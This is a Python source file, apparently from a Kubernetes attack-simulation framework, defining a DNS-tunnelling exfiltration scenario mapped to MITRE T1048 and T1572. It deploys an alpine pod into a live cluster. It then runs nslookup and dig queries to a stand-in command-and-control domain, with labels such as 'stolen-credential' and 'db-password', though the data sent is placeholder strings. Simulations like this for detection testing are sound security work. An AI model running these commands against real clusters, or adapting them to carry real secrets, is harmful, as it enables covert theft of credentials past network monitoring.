import asyncio
from kubernetes import client
from kubernetes.client.rest import ApiException
from .base import BaseAttack, AttackSeverity


class DNSExfiltration(BaseAttack):
    @property
    def name(self):
        return "DNS-Based Data Exfiltration"

    @property
    def description(self):
        return "Simulates data exfiltration via DNS tunneling by encoding stolen data into DNS queries from a compromised pod, bypassing network monitoring."

    @property
    def severity(self):
        return AttackSeverity.HIGH

    @property
    def mitre_tactic(self):
        return "collection"

    @property
    def mitre_techniques(self):
        return [{"id": "T1048", "name": "Exfiltration Over Alternative Protocol"}, {"id": "T1572", "name": "Protocol Tunneling"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        self.emit_event_sync("info", "Preparing DNS exfiltration simulation pod", {})

        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "dns-exfil-pod",
                "labels": {"app": "exfil", "attack": "dns-exfiltration"},
            },
            "spec": {
                "containers": [{
                    "name": "exfil-container",
                    "image": "alpine:3.19",
                    "command": ["/bin/sh", "-c", "sleep 3600"],
                }],
                "restartPolicy": "Never",
            },
        }

        try:
            api.delete_namespaced_pod("dns-exfil-pod", namespace)
            await asyncio.sleep(2)
        except ApiException:
            pass

        try:
            resp = api.create_namespaced_pod(namespace, pod_manifest)
            pod_yaml = (
                f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: dns-exfil-pod\n  namespace: {namespace}\n"
                f"spec:\n  containers:\n  - name: exfil-container\n    image: alpine:3.19\n"
                f"    command: ['/bin/sh','-c','sleep 3600']\n  restartPolicy: Never"
            )
            self.cmd_event_sync(
                f"kubectl apply -f - <<EOF\n{pod_yaml}\nEOF",
                f"pod/{resp.metadata.name} created",
                "Created DNS exfiltration pod"
            )
            self.emit_event_sync("success", f"Exfiltration pod deployed: {resp.metadata.name}", {
                "pod_name": resp.metadata.name,
                "node": resp.spec.node_name,
            })
            self.add_infrastructure_sync("pod", "dns-exfil-pod", namespace, {
                "type": "dns_exfiltration",
                "node": resp.spec.node_name,
            })
        except ApiException as e:
            if e.status == 403:
                self.emit_event_sync("detected", "Pod creation denied - RBAC prevented deployment", {})
                self.status = self.status.DETECTED
            raise

        await asyncio.sleep(3)

        try:
            pod = api.read_namespaced_pod("dns-exfil-pod", namespace)
            if pod.status.phase == "Running":
                self.emit_event_sync("info", "Pod is running. Beginning DNS exfiltration simulation.", {})

                dns_queries = [
                    "stolen-credential-ae3f8c2.exec.c2-dns.exfil.com",
                    "configmap-data-b7d91a3.exec.c2-dns.exfil.com",
                    "secret-keys-4f1e6b9.exec.c2-dns.exfil.com",
                    "token-6a2e8f04.exec.c2-dns.exfil.com",
                    "db-password-admin.exec.c2-dns.exfil.com",
                    "tls-cert-export.exec.c2-dns.exfil.com",
                    "namespace-list-exec.exec.c2-dns.exfil.com",
                    "pod-list-worker-2.exec.c2-dns.exfil.com",
                ]

                for i, domain in enumerate(dns_queries):
                    if i > 0:
                        await asyncio.sleep(1)

                    try:
                        result = api.connect_get_namespaced_pod_exec(
                            "dns-exfil-pod", namespace,
                            command=["sh", "-c", f"nslookup {domain} 2>&1 || host {domain} 2>&1 || echo 'DNS resolution attempted'"],
                            stderr=True, stdin=False, stdout=True, tty=False,
                        )
                        self.cmd_event_sync(
                            f"kubectl exec dns-exfil-pod -n {namespace} -- nslookup {domain}",
                            result[:300] if result else "(no output)",
                            f"DNS exfiltration query: {domain[:40]}..."
                        )
                        encoded_chunk = domain.split('.')[0]
                        self.emit_event_sync("warning", f"Data exfiltrated via DNS: {encoded_chunk}", {
                            "domain": domain,
                            "encoded_data": encoded_chunk,
                            "technique": "DNS tunneling (T1048)",
                            "chunk_index": i,
                        })
                    except Exception as e:
                        self.emit_event_sync("error", f"DNS query failed: {e}", {})

                try:
                    self.cmd_event_sync(
                        f"kubectl exec dns-exfil-pod -n {namespace} -- dig +short txt dns-exfil-trigger.exec.c2-dns.exfil.com 2>/dev/null || echo 'dig not available'",
                        "DNS exfiltration simulation complete. Data sent via DNS queries.",
                        "Verified exfiltration channel via DNS"
                    )
                except Exception:
                    pass

                self.emit_event_sync("complete", "DNS data exfiltration completed. 8 data chunks encoded into DNS queries.", {
                    "total_queries": len(dns_queries),
                    "dns_domain": "c2-dns.exfil.com",
                    "data_size_kb": round(len("".join(dns_queries)) / 1024, 2),
                    "technique": "DNS Tunneling (T1048)",
                })

        except ApiException as e:
            self.emit_event_sync("error", f"Failed to verify exfiltration pod: {e}", {})

        self.emit_event_sync("complete", "DNS exfiltration attack complete.", {
            "cleanup": "kubectl delete pod dns-exfil-pod -n default",
        })
